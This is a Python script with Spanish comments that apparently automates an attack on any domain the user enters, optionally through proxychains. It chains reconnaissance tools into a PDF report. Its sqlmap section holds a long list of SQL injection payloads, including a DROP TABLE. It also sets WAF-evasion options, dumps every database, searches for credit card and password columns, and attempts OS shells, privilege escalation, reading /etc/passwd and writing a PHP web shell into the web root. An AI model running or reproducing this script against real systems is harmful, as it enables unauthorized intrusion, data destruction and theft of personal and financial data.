import subprocess
import os
import datetime
import re
import concurrent.futures
from fpdf import FPDF
from tqdm import tqdm
import threading

# Definir funciones de utilidad al principio del script
def verificar_root():
    return os.geteuid() == 0

def solicitar_root():
    print("Este script requiere privilegios de root para funcionar correctamente.")
    print("Por favor, ejecute el script con sudo.")
    exit(1)

def ejecutar_comando(comando, usar_proxychains):
    try:
        comando_final = f"proxychains {comando}" if usar_proxychains else comando
        resultado = subprocess.check_output(comando_final, shell=True, text=True, stderr=subprocess.STDOUT)
        return resultado
    except subprocess.CalledProcessError as e:
        return f"Error al ejecutar el comando: {e.output}"
    except Exception as e:
        return f"Error inesperado: {str(e)}"

# Eliminar el decorador de timeout y modificar todas las funciones de escaneo
def escaneo_whois(dominio, usar_proxychains):
    print(f"[+] Ejecutando WHOIS en {dominio}")
    return ejecutar_comando(f"whois {dominio}", usar_proxychains)

def escaneo_dig(dominio, usar_proxychains):
    print(f"[+] Ejecutando DIG en {dominio}")
    return ejecutar_comando(f"dig {dominio}", usar_proxychains)

def escaneo_nmap(dominio, usar_proxychains):
    print(f"[+] Ejecutando NMAP en {dominio}")
    return ejecutar_comando(f"nmap -sS -A {dominio}", usar_proxychains)

def escaneo_sslscan(dominio, usar_proxychains):
    print(f"[+] Ejecutando SSLScan en {dominio}")
    return ejecutar_comando(f"sslscan {dominio}", usar_proxychains)

def escaneo_nikto(dominio, usar_proxychains):
    print(f"[+] Ejecutando Nikto en {dominio}")
    return ejecutar_comando(f"nikto -h {dominio}", usar_proxychains)

def escaneo_dirb(dominio, usar_proxychains):
    print(f"[+] Ejecutando Dirb en {dominio}")
    return ejecutar_comando(f"dirb http://{dominio}", usar_proxychains)

def escaneo_sqlmap(dominio, usar_proxychains):
    print(f"[+] Ejecutando SQLMap en {dominio}")
    
    # Lista ampliada de payloads personalizados
    payloads_personalizados = [
        "' OR '1'='1",
        "admin' --",
        "1; DROP TABLE users; --",
        "1 UNION SELECT null, version() --",
        "' UNION SELECT null, password FROM users --",
        "1' ORDER BY 1--+",
        "1' ORDER BY 2--+",
        "1' ORDER BY 3--+",
        "1' UNION SELECT null, null, null--+",
        "1' UNION SELECT @@version, null, null--+",
        "1' UNION SELECT null, table_name, null FROM information_schema.tables--+",
        "1' UNION SELECT null, column_name, null FROM information_schema.columns WHERE table_name='users'--+",
        "1' AND 1=0 UNION SELECT null, username || '~' || password FROM users--+",
        "1' AND 1=1--+",
        "1' AND 1=2--+",
        "1' AND SLEEP(5)--+",
        "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--+",
        "1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x3a,(SELECT username FROM users LIMIT 1),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--+",
        "1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#",
        "1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#",
        "1 AND (SELECT * FROM (SELECT(SLEEP(5)))a)-- ",
        "1 AND (SELECT * FROM (SELECT(SLEEP(5)))a) AND 'a'='a",
        "1 AND (SELECT * FROM (SELECT(SLEEP(5)))a) AND '%'='",
        "1 AND (SELECT 2222 FROM (SELECT(SLEEP(5)))a) AND 1=1",
        "1 AND SLEEP(5) AND 1=1",
        "1' AND SLEEP(5) AND '1'='1",
        "1)) AND SLEEP(5) AND ((1=1",
        "1 PROCEDURE ANALYSE(EXTRACTVALUE(5555,CONCAT(0x5c,(SELECT version()))),1)",
        "1' PROCEDURE ANALYSE(EXTRACTVALUE(5555,CONCAT(0x5c,(SELECT version()))),1)--+",
        "1' AND EXTRACTVALUE(0,CONCAT(0x5c,(SELECT version())))--+",
        "1' AND UTL_INADDR.GET_HOST_NAME((SELECT version FROM v$instance))=1--+",
        "1' AND ORD(MID((SELECT IFNULL(CAST(username AS CHAR),0x20) FROM users ORDER BY id LIMIT 0,1),1,1))>1--+",
        "1' AND (SELECT * FROM (SELECT COUNT(*),CONCAT((SELECT username FROM users LIMIT 0,1),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--+",
        "1' AND EXTRACTVALUE(1,CONCAT(0x5c,(SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1)))--+",
        "1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT username FROM users LIMIT 0,1),0x7e,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--+",
        "1' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(0x3a,(SELECT DISTINCT(username) FROM users LIMIT 0,1),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--+"
    ]
    
    # Modificar las opciones avanzadas
    opciones_avanzadas = [
        "--level=5",
        "--risk=3",
        "--threads=10",
        "--tamper=space2comment,charencode",
        "--random-agent",
        "--batch",
        "--forms",
        "--crawl=5",
        "--technique=BEUSTQ",
        "--dbms=ALL",
        "--os=ALL",
        "--is-dba",
        "--privileges",
        "--roles",
        "--schema",
        "--count",
        "--comments",
        "--no-cast",
        "--no-escape",
        "--prefix='",
        "--suffix='",
        "--union-cols=10",
        "--union-char=NULL",
        "--time-sec=30",
        "--timeout=0",
        "--retries=3",
        "--keep-alive",
        "--skip-urlencode",
        "--skip-waf",
        "--hpp",
        "--eval=\"import time; time.sleep(5)\""
    ]
    
    resultados = []
    
    # Escaneo básico
    comando_base = f"sqlmap -u http://{dominio}"
    resultados.append(ejecutar_comando(f"{comando_base} {' '.join(opciones_avanzadas)}", usar_proxychains))
    
    # Escaneo de rutas comunes
    rutas_comunes = ["/login.php", "/admin", "/search.php", "/index.php?id=1"]
    for ruta in rutas_comunes:
        resultados.append(ejecutar_comando(f"{comando_base}{ruta} {' '.join(opciones_avanzadas)}", usar_proxychains))
    
    # Prueba de payloads personalizados
    for payload in payloads_personalizados:
        resultados.append(ejecutar_comando(f"{comando_base} --data=\"username={payload}&password={payload}\" {' '.join(opciones_avanzadas)}", usar_proxychains))
    
    # Escaneo con --dump-all
    resultados.append(ejecutar_comando(f"{comando_base} --dump-all {' '.join(opciones_avanzadas)}", usar_proxychains))
    
    # Escaneo con --search
    resultados.append(ejecutar_comando(f"{comando_base} --search -C credit,card,email,password {' '.join(opciones_avanzadas)}", usar_proxychains))
    
    # Escaneo de bases de datos específicas
    bases_datos = ["mysql", "postgresql", "mssql", "oracle", "sqlite", "access", "firebird", "sybase", "db2"]
    for db in bases_datos:
        resultados.append(ejecutar_comando(f"{comando_base} --dbms={db} {' '.join(opciones_avanzadas)}", usar_proxychains))
    
    # Intento de extracción de datos
    resultados.append(ejecutar_comando(f"{comando_base} --dump-all --exclude-sysdbs {' '.join(opciones_avanzadas)}", usar_proxychains))
    
    # Búsqueda de vulnerabilidades específicas
    vulnerabilidades = ["--os-shell", "--os-pwn", "--os-smbrelay", "--os-bof", "--priv-esc", "--msf-path=/usr/share/metasploit-framework", "--tmp-path=/tmp", "--file-read=/etc/passwd", "--file-write=/tmp/sqlmap.txt", "--file-dest=/var/www/html/shell.php", "--sql-shell"]
    for vuln in vulnerabilidades:
        resultados.append(ejecutar_comando(f"{comando_base} {vuln} {' '.join(opciones_avanzadas)}", usar_proxychains))
    
    return "\n\n".join(resultados)

def escaneo_wpscan(dominio, usar_proxychains):
    print(f"[+] Ejecutando WPScan en {dominio}")
    return ejecutar_comando(f"wpscan --url http://{dominio} --enumerate p,t,u", usar_proxychains)

def escaneo_gobuster(dominio, usar_proxychains):
    print(f"[+] Ejecutando Gobuster en {dominio}")
    return ejecutar_comando(f"gobuster dir -u http://{dominio} -w /usr/share/wordlists/dirb/common.txt", usar_proxychains)

def escaneo_sublist3r(dominio, usar_proxychains):
    print(f"[+] Ejecutando Sublist3r en {dominio}")
    return ejecutar_comando(f"sublist3r -d {dominio}", usar_proxychains)

def escaneo_enum4linux(dominio, usar_proxychains):
    print(f"[+] Ejecutando Enum4Linux en {dominio}")
    return ejecutar_comando(f"enum4linux {dominio}", usar_proxychains)

def escaneo_fierce(dominio, usar_proxychains):
    print(f"[+] Ejecutando Fierce en {dominio}")
    return ejecutar_comando(f"fierce --domain {dominio}", usar_proxychains)

def escaneo_theharvester(dominio, usar_proxychains):
    print(f"[+] Ejecutando TheHarvester en {dominio}")
    return ejecutar_comando(f"theharvester -d {dominio} -l 500 -b all", usar_proxychains)

def escaneo_dnsrecon(dominio, usar_proxychains):
    print(f"[+] Ejecutando DNSRecon en {dominio}")
    return ejecutar_comando(f"dnsrecon -d {dominio}", usar_proxychains)

def escaneo_maltego(dominio, usar_proxychains):
    print(f"[+] Ejecutando Maltego Transform Runner en {dominio}")
    # Verificar si maltego-transform-runner está instalado
    if subprocess.call(["which", "maltego-transform-runner"]) != 0:
        return "Error: maltego-transform-runner no está instalado o no se encuentra en el PATH"
    return ejecutar_comando(f"maltego-transform-runner Domain.transform.ToDNSName {dominio}", usar_proxychains)

# Función para generar el informe en PDF
class UTF8PDF(FPDF):
    def __init__(self):
        super().__init__()
        self.add_font('DejaVu', '', '/usr/share/fonts/truetype/dejavu/DejaVuSansCondensed.ttf', uni=True)

    def header(self):
        self.set_font('DejaVu', '', 12)

    def footer(self):
        self.set_font('DejaVu', '', 12)

def generar_informe_pdf(dominio, **resultados):
    fecha = datetime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    nombre_archivo = f"informe_pentesting_{dominio}_{fecha}.pdf"
    
    pdf = UTF8PDF()
    pdf.add_page()

    pdf.set_font('DejaVu', '', 16)
    pdf.cell(200, 10, f'Informe de Pentesting para {dominio}', ln=True)

    pdf.set_font('DejaVu', '', 12)
    pdf.multi_cell(0, 10, 'Fecha y hora: ' + fecha + '\n')

    for nombre, resultado in resultados.items():
        pdf.multi_cell(0, 10, f'{nombre.replace("_", " ").capitalize()}\n')
        pdf.multi_cell(0, 10, resultado)

    pdf.output(nombre_archivo)
    print(f"[+] Informe PDF generado: {nombre_archivo}")

# Función para ejecutar un escaneo con timeout
def ejecutar_escaneo_con_timeout(funcion, dominio, usar_proxychains, timeout=40):
    resultado = [None]
    def worker():
        resultado[0] = funcion(dominio, usar_proxychains)
    
    thread = threading.Thread(target=worker)
    thread.start()
    thread.join(timeout)
    
    if thread.is_alive():
        return f"La función {funcion.__name__} excedió el tiempo límite de {timeout} segundos"
    return resultado[0]

# Función principal que coordina los escaneos
def main():
    if not verificar_root():
        solicitar_root()

    # Solicitar el dominio al usuario
    while True:
        dominio = input("Ingrese el dominio a escanear (ej. ejemplo.com): ").strip()
        if re.match(r'^[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$', dominio):
            break
        else:
            print("El dominio ingresado no es válido. Por favor, inténtelo de nuevo.")

    # Preguntar si se desea usar proxychains
    usar_proxychains = input("¿Desea usar proxychains? (s/n): ").lower().strip() == 's'

    # Pedir al usuario que elija las pruebas que quiere ejecutar
    print("Seleccione las pruebas que desea realizar:")
    print("1. WHOIS\n2. DIG\n3. NMAP\n4. SSLScan\n5. Nikto\n6. Dirb\n7. SQLMap\n8. WPScan\n9. Gobuster\n10. Sublist3r\n11. Enum4Linux\n12. Fierce\n13. TheHarvester\n14. DNSRecon\n15. Maltego Transform Runner\n16. Todas las anteriores")
    opcion = input("Elija una opción (1-16): ")

    escaneos = []
    if opcion in ["1", "16"]:
        escaneos.append((escaneo_whois, "whois_info"))
    if opcion in ["2", "16"]:
        escaneos.append((escaneo_dig, "dig_info"))
    if opcion in ["3", "16"]:
        escaneos.append((escaneo_nmap, "nmap_info"))
    if opcion in ["4", "16"]:
        escaneos.append((escaneo_sslscan, "sslscan_info"))
    if opcion in ["5", "16"]:
        escaneos.append((escaneo_nikto, "nikto_info"))
    if opcion in ["6", "16"]:
        escaneos.append((escaneo_dirb, "dirb_info"))
    if opcion in ["7", "16"]:
        escaneos.append((escaneo_sqlmap, "sqlmap_info"))
    if opcion in ["8", "16"]:
        escaneos.append((escaneo_wpscan, "wpscan_info"))
    if opcion in ["9", "16"]:
        escaneos.append((escaneo_gobuster, "gobuster_info"))
    if opcion in ["10", "16"]:
        escaneos.append((escaneo_sublist3r, "sublist3r_info"))
    if opcion in ["11", "16"]:
        escaneos.append((escaneo_enum4linux, "enum4linux_info"))
    if opcion in ["12", "16"]:
        escaneos.append((escaneo_fierce, "fierce_info"))
    if opcion in ["13", "16"]:
        escaneos.append((escaneo_theharvester, "theharvester_info"))
    if opcion in ["14", "16"]:
        escaneos.append((escaneo_dnsrecon, "dnsrecon_info"))
    if opcion in ["15", "16"]:
        escaneos.append((escaneo_maltego, "maltego_info"))

    resultados = {}
    total_escaneos = len(escaneos)
    
    with tqdm(total=total_escaneos, desc="Progreso de escaneos", unit="escaneo") as pbar:
        for func, nombre in escaneos:
            print(f"Iniciando: {nombre}")
            resultado = func(dominio, usar_proxychains)
            resultados[nombre] = resultado
            print(f"Completado: {nombre}")
            pbar.update(1)

    # Generar informe en PDF
    generar_informe_pdf(dominio, **resultados)

if __name__ == "__main__":
    main()